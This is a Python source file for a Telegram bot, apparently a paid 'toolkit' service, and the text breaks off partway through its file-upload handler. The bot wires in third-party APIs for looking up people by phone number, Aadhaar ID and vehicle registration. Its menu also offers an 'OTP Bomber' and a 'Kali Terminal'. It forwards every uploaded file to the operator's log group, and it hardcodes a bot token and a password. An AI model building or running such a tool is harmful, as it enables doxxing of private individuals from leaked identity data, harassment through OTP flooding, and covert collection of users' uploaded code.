import telebot
from telebot import types
import subprocess
import os
import zipfile
import shutil
import time
import threading
import sys
import random
import string
import requests
import paramiko
import ast
import socket
import json
import re
import hashlib
import datetime
from datetime import datetime, timedelta
import uuid
import secrets
import instaloader
from urllib.parse import urlparse, quote
import psutil
import traceback
import io
import tempfile
import asyncio
import aiohttp
import aiosmtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import imaplib
import email
from email.header import decode_header
import smtplib
from bs4 import BeautifulSoup
import urllib.parse

# ==========================================
# 🔐 PASSWORD PROTECTION
# ==========================================
DEFAULT_PASSWORD = "BACHIRA DADDY"
BOT_PASSWORD = DEFAULT_PASSWORD
AUTHORIZED_USERS = set()

# Bot ON/OFF state
BOT_ENABLED = True

# ==========================================
# 🔧 CONFIGURATION & GLOBALS
# ==========================================
TOKEN = '8244413034:AAGb0L-9ONwWNLVBNAkoUi2__zUtuK7Z-lc'
ADMIN_ID = 7360971497
OWNER_USERNAME = "@MostHatedPersonn"
BOT_USERNAME = "POWERED BY ZEXUS"
LOG_GROUP_ID = -1003142118859

# Default force channels
FORCE_CHANNELS = [
    {
        "channel_username": "https://t.me/ZexusEra",
        "channel_link": "https://t.me/ZexusEra",
        "channel_type": "public",
        "added_by": ADMIN_ID,
        "added_date": datetime.now().strftime("%Y-%m-%d")
    }
]

# APIs
APIS = {
    "NUMBER_API": "https://neonblade-num.vercel.app/api?key=paid&type=mobile&term=",
    "AADHAAR_API": "https://shatirowner-family-info.vercel.app/fetch?key=Shatirowner&aadhaar=",
    "VEHICLE_API": "https://reseller-host.vercel.app/api/rc?number=",
    "SHERLOCK_API": "https://sherlock-api-omega.vercel.app/phone?username="
}

# Paths
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
UPLOAD_DIR = os.path.join(BASE_DIR, 'user_bots')
BOMBER_DIR = os.path.join(BASE_DIR, 'bomber_files')

# Database paths
DB_DIR = os.path.join(BASE_DIR, 'database')
os.makedirs(DB_DIR, exist_ok=True)

USERS_DB_FILE = os.path.join(DB_DIR, 'users.json')
FILES_DB_FILE = os.path.join(DB_DIR, 'files.json')
SUBS_DB_FILE = os.path.join(DB_DIR, 'subscriptions.json')
KEYS_DB_FILE = os.path.join(DB_DIR, 'keys.json')
BANS_DB_FILE = os.path.join(DB_DIR, 'bans.json')
VPS_DB_FILE = os.path.join(DB_DIR, 'vps.json')
REFERRALS_DB_FILE = os.path.join(DB_DIR, 'referrals.json')
TEMP_MAIL_DB_FILE = os.path.join(DB_DIR, 'temp_mails.json')
SETTINGS_DB_FILE = os.path.join(DB_DIR, 'settings.json')
APIS_DB_FILE = os.path.join(DB_DIR, 'apis.json')
FORCE_CHANNELS_FILE = os.path.join(DB_DIR, 'force_channels.json')
AUTH_USERS_FILE = os.path.join(DB_DIR, 'auth_users.json')

# Ensure Directories
os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(BOMBER_DIR, exist_ok=True)

# Globals
bot = telebot.TeleBot(TOKEN)

action_sessions = {}
running_processes = {}
vps_sessions = {}
temp_mail_sessions = {}

# Rate Limiting
RATE_LIMIT_DURATION = 10
RATE_LIMIT_COUNT = 20
BAN_DURATION = 30
last_actions = {}

# Global requirements cache
global_requirements = []

# Channel limits
MAX_PUBLIC_CHANNELS = 10
MAX_PRIVATE_CHANNELS = 10

# Referral rewards
REFERRAL_REWARDS = {
    10: {"days": 2, "name": "2 Days Premium"},
    20: {"days": 5, "name": "5 Days Premium"},
    30: {"days": 7, "name": "7 Days Premium"},
    50: {"days": 30, "name": "30 Days Premium"}
}

# Database containers
force_channels = []
users_db = {}
files_db = {}
subs_db = {}
keys_db = {}
bans_db = {}
referrals_db = {}
vps_db = {}
user_channels = {}
temp_mails_db = {}
settings_db = {}
apis_db = {}

# Feature flags
FEATURE_FLAGS = {
    "c_to_binary": True,
    "file_hosting": True,
    "number_lookup": True,
    "aadhaar_lookup": True,
    "vehicle_lookup": True,
    "sherlock_lookup": False,
    "otp_bomber": True,
    "temp_mail": True,
    "install_pips": True,
    "kali_terminal": True,
    "vps_manager": True,
    "instagram_dl": True
}

# ==========================================
# 📦 DATABASE MANAGEMENT
# ==========================================
def load_database(file_path, default_value):
    try:
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        return default_value
    except Exception as e:
        print(f"Error loading {file_path}: {e}")
        return default_value

def save_database(file_path, data):
    try:
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        return True
    except Exception as e:
        print(f"Error saving {file_path}: {e}")
        return False

def init_databases():
    global force_channels, users_db, files_db, subs_db, keys_db, bans_db, referrals_db, vps_db, user_channels, temp_mails_db, settings_db, apis_db
    global BOT_PASSWORD, BOT_ENABLED
    
    force_channels = load_database(FORCE_CHANNELS_FILE, [])
    if not force_channels:
        force_channels = FORCE_CHANNELS.copy()
        save_database(FORCE_CHANNELS_FILE, force_channels)
    
    users_db = load_database(USERS_DB_FILE, {})
    files_db = load_database(FILES_DB_FILE, {})
    subs_db = load_database(SUBS_DB_FILE, {})
    keys_db = load_database(KEYS_DB_FILE, {})
    bans_db = load_database(BANS_DB_FILE, {})
    referrals_db = load_database(REFERRALS_DB_FILE, {})
    vps_db = load_database(VPS_DB_FILE, {})
    temp_mails_db = load_database(TEMP_MAIL_DB_FILE, {})
    settings_db = load_database(SETTINGS_DB_FILE, {})
    apis_db = load_database(APIS_DB_FILE, APIS.copy())
    
    user_channels = {}
    
    if 'feature_flags' not in settings_db:
        settings_db['feature_flags'] = FEATURE_FLAGS.copy()
        save_database(SETTINGS_DB_FILE, settings_db)
    
    # 🔐 Load password from DB
    if 'bot_password' not in settings_db:
        settings_db['bot_password'] = DEFAULT_PASSWORD
        save_database(SETTINGS_DB_FILE, settings_db)
    BOT_PASSWORD = settings_db.get('bot_password', DEFAULT_PASSWORD)
    
    # 🔴 Load bot enabled state
    if 'bot_enabled' not in settings_db:
        settings_db['bot_enabled'] = True
        save_database(SETTINGS_DB_FILE, settings_db)
    BOT_ENABLED = settings_db.get('bot_enabled', True)
    
    print(f"🔐 Loaded password: {'*' * len(BOT_PASSWORD)}")
    print(f"🔴 Bot enabled: {BOT_ENABLED}")

def save_all_databases():
    save_database(FORCE_CHANNELS_FILE, force_channels)
    save_database(USERS_DB_FILE, users_db)
    save_database(FILES_DB_FILE, files_db)
    save_database(SUBS_DB_FILE, subs_db)
    save_database(KEYS_DB_FILE, keys_db)
    save_database(BANS_DB_FILE, bans_db)
    save_database(REFERRALS_DB_FILE, referrals_db)
    save_database(VPS_DB_FILE, vps_db)
    save_database(TEMP_MAIL_DB_FILE, temp_mails_db)
    save_database(SETTINGS_DB_FILE, settings_db)
    save_database(APIS_DB_FILE, apis_db)

init_databases()

def load_global_requirements():
    global global_requirements
    global_req_path = os.path.join(BASE_DIR, 'global_requirements.txt')
    if os.path.exists(global_req_path):
        with open(global_req_path, 'r') as f:
            global_requirements = [line.strip() for line in f if line.strip()]

load_global_requirements()

def get_all_channels():
    return force_channels

def get_channel_count_by_type(channel_type):
    return len([c for c in force_channels if c['channel_type'] == channel_type])

# ==========================================
# 🔐 AUTHENTICATION HELPERS
# ==========================================
def is_authenticated(uid):
    if uid == ADMIN_ID:
        return True
    if uid in AUTHORIZED_USERS:
        return True
    auth_users = load_database(AUTH_USERS_FILE, [])
    if str(uid) in auth_users:
        AUTHORIZED_USERS.add(uid)
        return True
    return False

def save_auth_user(uid):
    auth_users = load_database(AUTH_USERS_FILE, [])
    if str(uid) not in auth_users:
        auth_users.append(str(uid))
        save_database(AUTH_USERS_FILE, auth_users)

# ==========================================
# 🛡️ ANTI-SPAM & SECURITY
# ==========================================
def is_banned(uid):
    if uid == ADMIN_ID:
        return False, ""
    
    if str(uid) in bans_db:
        ban_data = bans_db[str(uid)]
        expiry = datetime.fromisoformat(ban_data['expiry'])
        if expiry > datetime.now():
            return expiry, ban_data['reason']
        else:
            del bans_db[str(uid)]
            save_database(BANS_DB_FILE, bans_db)
            return False, ""
    return False, ""

def check_rate_limit(uid):
    if uid == ADMIN_ID:
        return True
    
    # 🔴 NEW: Check if bot is disabled
    if not BOT_ENABLED:
        return False
    
    now = time.time()
    if uid not in last_actions:
        last_actions[uid] = []
    
    last_actions[uid] = [t for t in last_actions[uid] if now - t < RATE_LIMIT_DURATION]
    
    if len(last_actions[uid]) >= RATE_LIMIT_COUNT:
        ban_expiry = datetime.now() + timedelta(minutes=BAN_DURATION)
        ban_reason = "Spamming/Excessive Requests"
        
        bans_db[str(uid)] = {
            'expiry': ban_expiry.isoformat(),
            'reason': ban_reason
        }
        save_database(BANS_DB_FILE, bans_db)
        
        user_info = users_db.get(str(uid), {})
        username = f"@{user_info.get('username', '')}" if user_info.get('username') else f"ID:{uid}"
        
        log_to_group(f"🚨 USER BANNED (SPAM)\n👤 User: {username}\n🆔 ID: {uid}\n⏰ {BAN_DURATION} min")
        
        try:
            bot.send_message(uid, f"🚫 <b>BANNED</b>\n\nReason: {ban_reason}\nUntil: {ban_expiry.strftime('%H:%M')}\nContact: {OWNER_USERNAME}", parse_mode='HTML')
        except:
            pass
        return False
    
    last_actions[uid].append(now)
    return True

def rate_limit_and_ban_check(handler):
    def wrapper(m):
        uid = m.from_user.id
        
        # 🔴 NEW: Bot OFF check
        if not BOT_ENABLED and uid != ADMIN_ID:
            try:
                bot.reply_to(m, "🔴 <b>BOT IS CURRENTLY OFFLINE</b>\n\nBot has been temporarily disabled by owner.\nPlease try again later.\n\n👑 " + OWNER_USERNAME, parse_mode='HTML')
            except:
                pass
            return
        
        ban_expiry, ban_reason = is_banned(uid)
        if ban_expiry:
            return
        if not check_rate_limit(uid):
            return
        return handler(m)
    return wrapper

def rate_limit_and_ban_check_cb(handler):
    def wrapper(c):
        uid = c.from_user.id
        
        # 🔴 NEW: Bot OFF check
        if not BOT_ENABLED and uid != ADMIN_ID:
            bot.answer_callback_query(c.id, "🔴 Bot is currently offline!", show_alert=True)
            return
        
        ban_expiry, ban_reason = is_banned(uid)
        if ban_expiry:
            bot.answer_callback_query(c.id, f"🚫 BANNED! Until: {ban_expiry.strftime('%H:%M')}", show_alert=True)
            return
        if not check_rate_limit(uid):
            return
        return handler(c)
    return wrapper

# ==========================================
# 🛠️ FEATURE CONTROL
# ==========================================
def is_feature_enabled(feature_name):
    if ADMIN_ID:
        return True
    return settings_db.get('feature_flags', {}).get(feature_name, True)

def feature_check(feature_name):
    def decorator(handler):
        def wrapper(*args, **kwargs):
            if len(args) > 0:
                m = args[0]
                if hasattr(m, 'from_user'):
                    uid = m.from_user.id
                elif hasattr(m, 'message'):
                    uid = m.from_user.id
                    m = m.message
                else:
                    uid = m.chat.id
                
                if uid == ADMIN_ID:
                    return handler(*args, **kwargs)
                
                if not is_feature_enabled(feature_name):
                    if isinstance(m, types.CallbackQuery):
                        bot.answer_callback_query(m.id, f"❌ Feature ({feature_name}) disabled!", show_alert=True)
                    else:
                        bot.reply_to(m, f"❌ <b>Feature disabled!</b>\n\nFeature: {feature_name}", parse_mode='HTML')
                    return
            return handler(*args, **kwargs)
        return wrapper
    return decorator

# ==========================================
# 📊 HELPERS
# ==========================================
def get_footer():
    return f"\n\n💝 Dev: {OWNER_USERNAME} | 🤖 {BOT_USERNAME}"

def log_to_group(text, file_path=None, file_name=None):
    try:
        if file_path and os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                caption = f"{text}\n📄 File: {file_name}{get_footer()}" if file_name else f"{text}{get_footer()}"
                bot.send_document(LOG_GROUP_ID, f, caption=caption, parse_mode='HTML')
        else:
            bot.send_message(LOG_GROUP_ID, text + get_footer(), parse_mode='HTML')
    except Exception as e:
        print(f"Log error: {e}")

def log_user(m):
    uid = m.from_user.id
    uname = m.from_user.username
    fname = m.from_user.first_name
    
    uid_str = str(uid)
    if uid_str not in users_db:
        users_db[uid_str] = {
            'user_id': uid,
            'username': uname,
            'first_name': fname,
            'credits': 5,
            'total_referrals': 0,
            'joined_date': datetime.now().strftime("%Y-%m-%d"),
            'last_bonus_date': datetime.now().strftime("%Y-%m-%d"),
            'referral_code': generate_referral_code(uid),
            'referral_points': 0,
            'referral_keys_earned': ''
        }
        save_database(USERS_DB_FILE, users_db)

def generate_referral_code(user_id):
    return f"King{user_id % 10000:04d}{secrets.token_hex(2).upper()}"

def get_user_from_info(user_id):
    return users_db.get(str(user_id))

def is_premium(uid):
    if uid == ADMIN_ID:
        return True
    uid_str = str(uid)
    if uid_str in subs_db:
        expiry = datetime.fromisoformat(subs_db[uid_str]['expiry'])
        return expiry > datetime.now()
    return False

def check_all_channels_join(uid):
    if uid == ADMIN_ID:
        return True, ""
    
    not_joined_channels = []
    
    for channel in force_channels:
        channel_username = channel['channel_username'].replace('https://t.me/', '').replace('@', '')
        if not channel_username.startswith('@'):
            channel_username = '@' + channel_username
        
        try:
            if uid in user_channels and channel_username in user_channels[uid]:
                continue
            
            stat = bot.get_chat_member(channel_username, uid).status
            if stat not in ['creator', 'administrator', 'member']:
                not_joined_channels.append(channel_username)
            else:
                if uid not in user_channels:
                    user_channels[uid] = []
                if channel_username not in user_channels[uid]:
                    user_channels[uid].append(channel_username)
        except Exception as e:
            print(f"Error checking channel {channel_username}: {e}")
            not_joined_channels.append(channel_username)
    
    if not_joined_channels:
        return False, not_joined_channels[0]
    return True, ""

def auto_install_modules(path, fname, user_id):
    try:
        file_path = os.path.join(path, fname)
        if not os.path.exists(file_path):
            return
        
        global_req_path = os.path.join(BASE_DIR, 'global_requirements.txt')
        if os.path.exists(global_req_path):
            try:
                user_req_path = os.path.join(path, "requirements.txt")
                shutil.copy2(global_req_path, user_req_path)
                
                result = subprocess.run([sys.executable, '-m', 'pip', 'install', '--no-cache-dir', '-r', user_req_path],
                              cwd=path, timeout=180, capture_output=True, text=True)
                
                log_text = f"✅ Installed global requirements for {fname}"
                print(log_text)
                
                user_info = users_db.get(str(user_id), {})
                username = f"@{user_info.get('username', '')}" if user_info.get('username') else f"ID:{user_id}"
                
                log_to_group(f"📦 REQUIREMENTS INSTALLED\n👤 {username}\n📄 {fname}", user_req_path, "requirements.txt")
            except Exception as e:
                print(f"⚠️ Global requirements install error: {e}")
                fallback_install_modules(path, fname)
        else:
            fallback_install_modules(path, fname)
    except Exception as e:
        print(f"⚠️ Auto-install error for {fname}: {e}")

def fallback_install_modules(path, fname):
    try:
        file_path = os.path.join(path, fname)
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        tree = ast.parse(content)
        imports = set()
        
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for n in node.names:
                    imports.add(n.name.split('.')[0])
            elif isinstance(node, ast.ImportFrom):
                if node.module:
                    imports.add(node.module.split('.')[0])
        
        builtin_modules = set(sys.builtin_module_names)
        imports_to_install = [imp for imp in imports if imp not in builtin_modules and imp and not imp.startswith('_')]
        
        for module in imports_to_install:
            try:
                subprocess.run([sys.executable, '-m', 'pip', 'install', '--no-cache-dir', module],
                              cwd=path, timeout=30, capture_output=True)
            except:
                pass
    except:
        pass

# ==========================================
# 🔐 PASSWORD AUTHENTICATION FLOW
# ==========================================
def ask_password(m):
    uid = m.from_user.id
    action_sessions[uid] = "waiting_password"
    
    mk = types.InlineKeyboardMarkup()
    mk.add(types.InlineKeyboardButton("🔐 Enter Password", callback_data="enter_password"))
    
    bot.send_message(
        m.chat.id,
        f"🔐 <b>BOT ACCESS REQUIRED</b>\n\n"
        f"To use this bot, you need to enter the password.\n\n"
        f"📌 <b>How to get password:</b>\n"
        f"Contact the owner: {OWNER_USERNAME}\n\n"
        f"⚠️ <b>Note:</b> Password is required only once.\n"
        f"After entering correct password, you can use the bot freely.",
        reply_markup=mk,
        parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda c: c.data == "enter_password")
@rate_limit_and_ban_check_cb
def enter_password_prompt(c):
    uid = c.from_user.id
    action_sessions[uid] = "waiting_password"
    
    bot.answer_callback_query(c.id)
    bot.send_message(
        c.message.chat.id,
        "🔐 <b>Enter Password</b>\n\n"
        "Please send the password as a text message.\n\n"
        "Type /cancel to cancel.",
        parse_mode='HTML'
    )

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) == "waiting_password")
@rate_limit_and_ban_check
def check_password_input(m):
    uid = m.from_user.id
    text = m.text.strip()
    
    if text == '/cancel':
        if uid in action_sessions:
            del action_sessions[uid]
        bot.reply_to(m, "❌ Password entry cancelled.", parse_mode='HTML')
        return
    
    if text == BOT_PASSWORD:
        AUTHORIZED_USERS.add(uid)
        save_auth_user(uid)
        
        if uid in action_sessions:
            del action_sessions[uid]
        
        bot.reply_to(
            m,
            "✅ <b>Password Accepted!</b>\n\n"
            "You can now use the bot.\n\n"
            "Welcome!",
            parse_mode='HTML'
        )
        
        send_user_info(m)
        
        uname = f"@{m.from_user.username}" if m.from_user.username else f"ID:{uid}"
        log_to_group(f"🔐 USER AUTHENTICATED\n👤 {uname}\n🆔 {uid}")
    else:
        bot.reply_to(
            m,
            "❌ <b>Wrong Password!</b>\n\n"
            "Please try again or contact owner.",
            parse_mode='HTML'
        )

# ==========================================
# 🏠 START COMMAND
# ==========================================
@bot.message_handler(commands=['start', 'help'])
@rate_limit_and_ban_check
def start_command(m):
    try:
        uid = m.from_user.id
        print(f"📨 Start from: {uid}, Name: {m.from_user.first_name}")
        
        log_user(m)
        
        args = m.text.split()
        if len(args) > 1:
            referral_input = args[1]
            
            if referral_input.isdigit():
                referrer_id = int(referral_input)
                if referrer_id != uid and str(referrer_id) in users_db:
                    process_referral(uid, referrer_id)
            else:
                for user_id_str, user_data in users_db.items():
                    if user_data.get('referral_code') == referral_input and int(user_id_str) != uid:
                        process_referral(uid, int(user_id_str))
                        break
        
        if not is_authenticated(uid):
            ask_password(m)
            return
        
        joined, channel = check_all_channels_join(uid)
        if not joined:
            show_channels_to_join(m, uid)
            return
        
        send_user_info(m)
        
    except Exception as e:
        print(f"❌ Error in start_command: {e}")
        bot.reply_to(m, "❌ Error occurred. Please try again.")

def process_referral(new_user_id, referrer_id):
    if str(new_user_id) in referrals_db:
        return
    
    if referrer_id in user_channels and len(user_channels[referrer_id]) > 0:
        return
    
    referrals_db[str(new_user_id)] = {
        'invited_by': referrer_id,
        'joined_date': datetime.now().strftime("%Y-%m-%d"),
        'verified': False
    }
    save_database(REFERRALS_DB_FILE, referrals_db)

def verify_referral(user_id):
    user_id_str = str(user_id)
    if user_id_str in referrals_db and not referrals_db[user_id_str]['verified']:
        referral_data = referrals_db[user_id_str]
        referrer_id = referral_data['invited_by']
        
        referrals_db[user_id_str]['verified'] = True
        save_database(REFERRALS_DB_FILE, referrals_db)
        
        referrer_str = str(referrer_id)
        if referrer_str in users_db:
            users_db[referrer_str]['referral_points'] = users_db[referrer_str].get('referral_points', 0) + 1
            users_db[referrer_str]['total_referrals'] = users_db[referrer_str].get('total_referrals', 0) + 1
            
            current_points = users_db[referrer_str]['referral_points']
            check_and_give_referral_reward(referrer_id, current_points)
            
            try:
                bot.send_message(
                    referrer_id,
                    f"🎉 <b>REFERRAL VERIFIED!</b>\n\n"
                    f"➕ +1 Referral Point\n"
                    f"📊 Total Points: {current_points}",
                    parse_mode='HTML'
                )
            except:
                pass
        return True
    return False

def check_and_give_referral_reward(user_id, current_points):
    for threshold, reward in REFERRAL_REWARDS.items():
        if current_points == threshold:
            key_code = f"KING-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}"
            
            keys_db[key_code] = {
                'type': "PREM",
                'value': reward["days"],
                'generated_by': ADMIN_ID,
                'generated_date': datetime.now().strftime("%Y-%m-%d"),
                'used': False
            }
            save_database(KEYS_DB_FILE, keys_db)
            
            user_id_str = str(user_id)
            if user_id_str in users_db:
                current_keys = users_db[user_id_str].get('referral_keys_earned', '')
                new_keys = f"{current_keys},{reward['days']}d:{key_code}" if current_keys else f"{reward['days']}d:{key_code}"
                users_db[user_id_str]['referral_keys_earned'] = new_keys
                save_database(USERS_DB_FILE, users_db)
            
            expiry = (datetime.now() + timedelta(days=reward["days"])).isoformat()
            subs_db[user_id_str] = {'expiry': expiry}
            save_database(SUBS_DB_FILE, subs_db)
            
            try:
                bot.send_message(
                    user_id,
                    f"🎁 <b>REFERRAL REWARD UNLOCKED!</b>\n\n"
                    f"🎉 Reward: {reward['name']}\n"
                    f"🔑 Key: <code>{key_code}</code>\n"
                    f"⏰ Premium: {reward['days']} days",
                    parse_mode='HTML'
                )
            except:
                pass
            
            log_to_group(f"🎁 REFERRAL REWARD\n👤 ID: {user_id}\n📊 Points: {threshold}\n🎁 {reward['name']}")
            return True
    return False

def show_channels_to_join(m, uid):
    unjoined_channels = []
    for channel in force_channels:
        channel_username = channel['channel_username'].replace('https://t.me/', '').replace('@', '')
        if not channel_username.startswith('@'):
            channel_username = '@' + channel_username
            
        channel_link = channel['channel_link']
        channel_type = channel['channel_type']
        
        try:
            stat = bot.get_chat_member(channel_username, uid).status
            if stat not in ['creator', 'administrator', 'member']:
                unjoined_channels.append((channel_username, channel_link, channel_type))
        except:
            unjoined_channels.append((channel_username, channel_link, channel_type))
    
    if not unjoined_channels:
        verify_referral(uid)
        send_user_info(m)
        return
    
    mk = types.InlineKeyboardMarkup(row_width=1)
    
    for channel_username, channel_link, channel_type in unjoined_channels:
        channel_type_emoji = "🔒" if channel_type == "private" else "📢"
        mk.add(types.InlineKeyboardButton(f"{channel_type_emoji} Join {channel_username}", url=channel_link))
    
    mk.add(types.InlineKeyboardButton("✅ Verify Join", callback_data="check_join"))
    
    channels_list = "\n".join([f"• {channel[0]} ({'Private' if channel[2] == 'private' else 'Public'})" for channel in unjoined_channels])
    
    bot.send_message(
        m.chat.id,
        f"🔒 <b>ACCESS REQUIRED</b>\n\n"
        f"You must join all our channels to use this bot.\n\n"
        f"<b>Channels to join:</b>\n{channels_list}\n\n"
        f"After joining all channels, click <b>Verify Join</b>.",
        reply_markup=mk,
        parse_mode='HTML'
    )

def send_user_info(m):
    try:
        uid = m.from_user.id
        user_info = users_db.get(str(uid), {})
        
        try:
            photos = bot.get_user_profile_photos(uid, limit=1)
            has_photo = photos.total_count > 0
        except:
            has_photo = False
        
        premium_status = "✅ PREMIUM" if is_premium(uid) else "🆓 FREE"
        credits = user_info.get('credits', 0)
        referral_code = user_info.get('referral_code', generate_referral_code(uid))
        referral_points = user_info.get('referral_points', 0)
        total_referrals = user_info.get('total_referrals', 0)
        
        rewards_info = "🎁 <b>Referral Rewards:</b>\n"
        for threshold, reward in REFERRAL_REWARDS.items():
            status = "✅" if referral_points >= threshold else "⏳"
            rewards_info += f"{status} {threshold} points → {reward['name']}\n"
        
        star = "⭐ " if is_premium(uid) else ""
        
        caption = (
            f"{star}<b>👋 Welcome {m.from_user.first_name}!</b>{star}\n\n"
            f"🆔 <b>User ID:</b> {uid}\n"
            f"👤 <b>Username:</b> @{m.from_user.username if m.from_user.username else 'N/A'}\n"
            f"📊 <b>Status:</b> {premium_status}\n"
            f"💰 <b>Credits:</b> {credits}\n"
            f"🤝 <b>Referral Code:</b> <code>{referral_code}</code>\n"
            f"🔗 <b>Referral Link:</b> https://t.me/{BOT_USERNAME[1:]}?start={referral_code}\n"
            f"📊 <b>Referral Points:</b> {referral_points}\n"
            f"👥 <b>Total Referrals:</b> {total_referrals}\n"
            f"📅 <b>Joined:</b> {datetime.now().strftime('%Y-%m-%d')}\n\n"
            f"{rewards_info}\n"
            f"🤖 <b>Bot:</b> {BOT_USERNAME}\n"
            f"👑 <b>Owner:</b> {OWNER_USERNAME}\n\n"
            f"💡 <b>Use the buttons below:</b>"
        )
        
        mk = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        mk.add("📁 File Hosting", "⚙️ Manage Files")
        mk.add("🔧 C to Binary", "💻 Kali Terminal")
        mk.add("📞 Number Lookup", "🔍 Aadhaar Info")
        mk.add("🚗 Vehicle Lookup", "🕵️ Sherlock Lookup")
        mk.add("📥 Instagram DL", "🔑 Redeem Key")
        mk.add("🤝 Referral System", "💎 Pricing")
        mk.add("📊 My Info", "☁️ VPS Manager")
        mk.add("💣 OTP Bomber", "📧 Temp Mail")
        mk.add("🔧 Install Pips")
        
        if uid == ADMIN_ID:
            mk.add("👑 Owner Panel")
        
        if has_photo:
            try:
                bot.send_photo(m.chat.id, photos.photos[0][0].file_id, caption=caption, reply_markup=mk, parse_mode='HTML')
            except:
                bot.send_message(m.chat.id, caption, reply_markup=mk, parse_mode='HTML')
        else:
            bot.send_message(m.chat.id, caption, reply_markup=mk, parse_mode='HTML')
            
    except Exception as e:
        print(f"❌ Error in send_user_info: {e}")
        bot.reply_to(m, "❌ Error loading user info. Please try again.")

@bot.callback_query_handler(func=lambda c: c.data == "check_join")
@rate_limit_and_ban_check_cb
def cb_join(c):
    uid = c.from_user.id
    
    if not is_authenticated(uid):
        ask_password(c.message)
        return
    
    joined, channel = check_all_channels_join(uid)
    
    if joined:
        verify_referral(uid)
        bot.answer_callback_query(c.id, "✅ Verified! Welcome!")
        bot.delete_message(c.message.chat.id, c.message.message_id)
        send_user_info(c.message)
    else:
        bot.answer_callback_query(c.id, f"❌ Haven't joined {channel} yet!", show_alert=True)

@bot.message_handler(func=lambda m: m.text == "📊 My Info")
@rate_limit_and_ban_check
def my_info(m):
    if not is_authenticated(m.from_user.id):
        ask_password(m)
        return
    send_user_info(m)

# ==========================================
# 🤝 REFERRAL SYSTEM
# ==========================================
@bot.message_handler(func=lambda m: m.text == "🤝 Referral System")
@rate_limit_and_ban_check
def referral_system(m):
    if not is_authenticated(m.from_user.id):
        ask_password(m)
        return
        
    uid = m.from_user.id
    user_info = users_db.get(str(uid), {})
    
    referral_code = user_info.get('referral_code', generate_referral_code(uid))
    referral_points = user_info.get('referral_points', 0)
    total_referrals = user_info.get('total_referrals', 0)
    credits = user_info.get('credits', 0)
    
    earned_keys = user_info.get('referral_keys_earned', '')
    keys_list = ""
    if earned_keys:
        for key_part in earned_keys.split(','):
            if ':' in key_part:
                days, key_code = key_part.split(':')
                keys_list += f"• {days} days: <code>{key_code}</code>\n"
    
    referral_text = (
        f"🤝 <b>REFERRAL SYSTEM</b>\n\n"
        f"💰 <b>Your Credits:</b> {credits}\n"
        f"📊 <b>Referral Points:</b> {referral_points}\n"
        f"👥 <b>Total Referrals:</b> {total_referrals}\n\n"
        f"🔑 <b>Your Referral Code:</b>\n<code>{referral_code}</code>\n\n"
        f"🔗 <b>Referral Link:</b>\nhttps://t.me/{BOT_USERNAME[1:]}?start={referral_code}\n\n"
        f"🎁 <b>Reward System:</b>\n"
    )
    
    for threshold, reward in REFERRAL_REWARDS.items():
        status = "✅ UNLOCKED" if referral_points >= threshold else f"⏳ {referral_points}/{threshold}"
        referral_text += f"• {threshold} points → {reward['name']} ({status})\n"
    
    referral_text += f"\n📝 <b>How it works:</b>\n"
    referral_text += f"1. Share your link\n2. User joins ALL channels\n3. User enters password\n4. You get +1 point\n5. Reach points for rewards!\n\n"
    
    if keys_list:
        referral_text += f"🔑 <b>Keys Earned:</b>\n{keys_list}\n"
    
    mk = types.InlineKeyboardMarkup()
    mk.add(types.InlineKeyboardButton("📤 Share Referral", url=f"https://t.me/share/url?url=https://t.me/{BOT_USERNAME[1:]}?start={referral_code}&text=Join%20for%20free%20tools!"))
    
    bot.send_message(m.chat.id, referral_text, reply_markup=mk, parse_mode='HTML')

# ==========================================
# 📁 FILE HOSTING
# ==========================================
@bot.message_handler(func=lambda m: m.text == "📁 File Hosting")
@rate_limit_and_ban_check
@feature_check("file_hosting")
def upload_ask(m):
    if not is_authenticated(m.from_user.id):
        ask_password(m)
        return
    
    uid = m.from_user.id
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    bot.reply_to(m, "📤 <b>Upload your Python (.py) file</b>\n\n⚠️ Only .py files supported\n🔧 Required modules auto-installed\n\n<b>Send your .py file now:</b>", parse_mode='HTML')

@bot.message_handler(content_types=['document'])
@rate_limit_and_ban_check
def handle_docs(m):
    uid = m.from_user.id
    
    if not is_authenticated(uid):
        ask_password(m)
        return
    
    if action_sessions.get(uid) == "c_to_binary":
        return handle_c_file(m)
    
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    if not is_feature_enabled("file_hosting") and uid != ADMIN_ID:
        bot.reply_to(m, "❌ <b>File Hosting disabled!</b>", parse_mode='HTML')
        return
    
    if not is_premium(uid):
        user_files = [f for f_id, f in files_db.items() if f.get('user_id') == uid]
        if len(user_files) >= 1:
            bot.reply_to(m, "❌ <b>Free Limit Reached</b>\n\nFree users: 1 file max.\nUpgrade to Premium.\nTap 💎 Pricing.", parse_mode='HTML')
            return
    
    fname = m.document.file_name
    if not fname.endswith('.py'):
        bot.reply_to(m, "❌ Only .py files supported!", parse_mode='HTML')
        return
    
    uname = f"@{m.from_user.username}" if m.from_user.username else f"ID:{uid}"
    path = os.path.join(UPLOAD_DIR, str(uid))
    os.makedirs(path, exist_ok=True)
    full_path = os.path.join(path, fname)
    
    msg = bot.reply_to(m, "⏬ Downloading...", parse_mode='HTML')
    
    try:
        file_info = bot.get_file(m.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open(full_path, "wb") as f:
            f.write(downloaded_file)
        
        file_id = f"{uid}_{fname}"
        files_db[file_id] = {
            'user_id': uid,
            'filename': fname,
            'type': 'py',
            'uploaded_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'uploaded_by': uname
        }
        save_database(FILES_DB_FILE, files_db)
        
        log_to_group(f"📁 FILE UPLOADED\n👤 {uname}\n📄 {fname}", full_path, fname)
        
        mk = types.InlineKeyboardMarkup()
